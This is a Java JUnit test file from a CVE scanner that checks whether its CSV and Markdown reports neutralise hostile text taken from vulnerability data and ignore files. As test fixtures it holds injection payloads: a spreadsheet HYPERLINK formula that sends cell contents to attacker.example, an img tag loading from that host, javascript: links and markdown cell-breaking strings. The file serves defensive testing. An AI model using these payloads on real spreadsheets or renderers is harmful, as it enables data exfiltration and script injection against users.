package org.jtools.cvescanner.report;

/*-
 * #%L
 * CVEScanner
 * %%
 * Copyright (C) 2026 jtools.org
 * %%
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *      http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * #L%
 */

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.file.Path;
import java.time.LocalDate;
import java.util.List;
import java.util.Map;
import org.jtools.cvescanner.cvss.Environment;
import org.jtools.cvescanner.cvss.Rating;
import org.jtools.cvescanner.cvss.Score;
import org.jtools.cvescanner.cvss.Severity;
import org.jtools.cvescanner.i18n.I18nLanguage;
import org.jtools.cvescanner.i18n.Phrase;
import org.jtools.cvescanner.ignore.IgnoreRule;
import org.jtools.cvescanner.ignore.Ignores;
import org.jtools.cvescanner.model.Ecosystem;
import org.jtools.cvescanner.model.Finding;
import org.jtools.cvescanner.model.MatchBasis;
import org.jtools.cvescanner.model.ScanResult;
import org.jtools.cvescanner.model.Unresolved;
import org.junit.jupiter.api.Test;

/**
 * What a database or a project writes reaches the reports as text: no formula a spreadsheet would run in
 * findings.csv, no tag, link or table cell of its own in report.md.
 */
class HostileReportTest {

    private static final String FORMULA = "=HYPERLINK(\"http://attacker.example/?\"&A1,\"click\")";
    private static final String TAGS = "<img src=\"http://attacker.example/x.png\"> [click](javascript:alert(1)) | cell";

    private static Finding hostile() {
        Score score = new Score(null, null, null, Severity.HIGH, null, null);
        Rating rating = new Rating(Severity.HIGH, null, null, null);
        return new Finding(Severity.HIGH, score, Ecosystem.NPM, "pkg`<b>x</b>", "1.0" + TAGS, false, "direct", "dir/" + TAGS,
                "GHSA-x)](javascript:alert(1))", List.of("CVE-1" + TAGS), List.of(), "", FORMULA + TAGS, "details",
                "", "https://osv.dev/vulnerability/GHSA-x)](javascript:alert(1))", MatchBasis.ADVISORY,
                Phrase.of("match.note.advisory"), rating);
    }

    private static ScanResult result(Finding f) {
        return new ScanResult(Path.of("/scan"), List.of(f), List.of(),
                List.of(new Unresolved(Ecosystem.NPM, "left`" + TAGS, "git+" + TAGS, "package.json", Phrase.of("reason.unpinned", TAGS))),
                Map.of("db" + TAGS + ".zip", Phrase.of("database.kind.osv")), Map.of(), List.of(), Ignores.NONE);
    }

    @Test
    void aSpreadsheetRunsNoFormulaOfTheCsv() {
        String csv = Reports.csv(List.of(hostile()), Environment.NONE);
        assertTrue(csv.contains(",\"'=HYPERLINK("), csv);
        for (String line : csv.split("\n")) {
            for (String cell : line.split(",(?=(?:[^\"]*\"[^\"]*\")*[^\"]*$)")) {
                String value = cell.startsWith("\"") ? cell.substring(1) : cell;
                assertFalse(!value.isEmpty() && "=+@".indexOf(value.charAt(0)) >= 0, "a formula cell: " + cell);
            }
        }
    }

    @Test
    void theMarkdownHoldsNoTagNoLinkNoCellOfTheData() {
        Finding f = hostile();
        String md = Reports.markdown(result(f), Ignores.Split.none(List.of(f)), null, Environment.NONE, true, I18nLanguage.ENGLISH);
        // in a code span HTML is shown as it is; elsewhere every < is escaped
        String outsideCode = md.replaceAll("`[^`\n]*`", "");
        assertFalse(outsideCode.matches("(?s).*(?<!\\\\)<.*"), "a tag outside a code span: " + md);
        assertTrue(md.contains("`pkg'<b>x</b>`"), "a backquote ends no code span: " + md);
        assertFalse(outsideCode.matches("(?s).*(?<!\\\\)\\]\\(javascript:.*"), "a link of the data: " + md);
        assertTrue(md.contains("\\[click\\]"), md);
        assertTrue(md.contains("\\| cell"), md);
        assertTrue(md.contains("GHSA-x)\\](javascript:alert(1))"), "the unsafe address is text, not a link: " + md);
    }

    @Test
    void theIgnoredSectionHoldsNoTagNoLinkOfTheIgnoreFile() {
        Finding f = hostile();
        var ignores = new Ignores(Path.of("/scan/ignore.csv"), "ignore" + TAGS + ".csv", List.of(
                new IgnoreRule("CVE-1" + TAGS, "", "", null, "reason " + TAGS, 2),
                new IgnoreRule("CVE-2" + TAGS, "pkg" + TAGS, "1" + TAGS, LocalDate.of(2020, 1, 1), TAGS, 3),
                new IgnoreRule("CVE-3" + TAGS, "pkg`" + TAGS, "2" + TAGS, null, TAGS, 4)), true);
        var split = ignores.split(List.of(f), LocalDate.of(2026, 1, 1));
        assertTrue(split.active().isEmpty() && split.ignored().size() == 1 && split.expired().size() == 1
                && split.unused().size() == 1, split.toString());
        String md = Reports.markdown(result(f), split, null, Environment.NONE, true, I18nLanguage.ENGLISH);
        String outsideCode = md.replaceAll("`[^`\n]*`", "");
        assertFalse(outsideCode.matches("(?s).*(?<!\\\\)<.*"), "a tag outside a code span: " + md);
        assertFalse(outsideCode.matches("(?s).*(?<!\\\\)\\]\\(javascript:.*"), "a link of the data: " + md);
        assertTrue(md.contains("reason \\<img"), md);
    }
}
